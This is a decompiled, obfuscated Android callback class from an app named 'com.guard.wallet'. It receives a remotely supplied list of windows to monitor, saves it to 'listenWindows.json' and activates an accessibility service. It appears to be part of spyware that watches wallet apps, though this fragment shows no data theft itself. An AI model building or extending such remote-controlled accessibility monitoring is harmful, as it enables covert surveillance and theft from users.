package com.guard.wallet.http;

import android.util.Log;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.service.MyAccessibilityService;
import java.io.IOException;
import java.util.List;
import p0.j0;
import p0.l0;

public final class m implements p0.e {
   @Override
   public final void b(p0.e0 var1, IOException var2) {
      a1.q.s("ListenWindowCallback", var2);
      if (!(var2 instanceof s.b)) {
         i.c(var1.c.a.h);
         l.x(var1, this);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void d(p0.e0 var1, j0 var2) {
      i.c(var1.c.a.h);
      l0 var11 = var2.g;
      label72:
      if (var11 != null) {
         Exception var10000;
         label74: {
            ApiResult var14;
            try {
               ListenWindowCallback$1 var4 = new ListenWindowCallback$1();
               var14 = (ApiResult)com.guard.wallet.utils.h.c(var11.z(), var4);
            } catch (Exception var10) {
               var10000 = var10;
               boolean var10001 = false;
               break label74;
            }

            if (var14 == null) {
               break label72;
            }

            label65: {
               label64: {
                  boolean var3;
                  String var15;
                  label63: {
                     try {
                        if (!var14.getSuccess()) {
                           break label72;
                        }

                        if (var14.getData() == null || ((List)var14.getData()).isEmpty()) {
                           break label65;
                        }

                        var12 = com.guard.wallet.utils.h.N(var14.getData());
                        if (a1.q.B(var12)) {
                           break label64;
                        }

                        var15 = com.guard.wallet.utils.g.i0();
                        if (a1.q.B(var15)) {
                           break label64;
                        }

                        var15 = var15.concat("/").concat("listenWindows.json");
                        Log.d("ListenWindowCallback", var15);
                        if (!a1.q.w(var15)) {
                           var3 = a1.q.l(var15);
                           break label63;
                        }
                     } catch (Exception var9) {
                        var10000 = var9;
                        boolean var16 = false;
                        break label74;
                     }

                     var3 = true;
                  }

                  if (var3) {
                     try {
                        a1.q.U(var15, var12);
                     } catch (Exception var8) {
                        var10000 = var8;
                        boolean var17 = false;
                        break label74;
                     }
                  }
               }

               try {
                  Log.d("ListenWindowCallback", "远程监听窗口已触达");
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var18 = false;
                  break label74;
               }
            }

            try {
               if (MyAccessibilityService.P() != null && com.guard.wallet.utils.g.H((List)var14.getData()) > 0) {
                  MyAccessibilityService.P().F(1);
               }
               break label72;
            } catch (Exception var6) {
               var10000 = var6;
               boolean var19 = false;
            }
         }

         Exception var13 = var10000;
         a1.q.s("ListenWindowCallback", var13);
      }

      var2.close();
   }
}
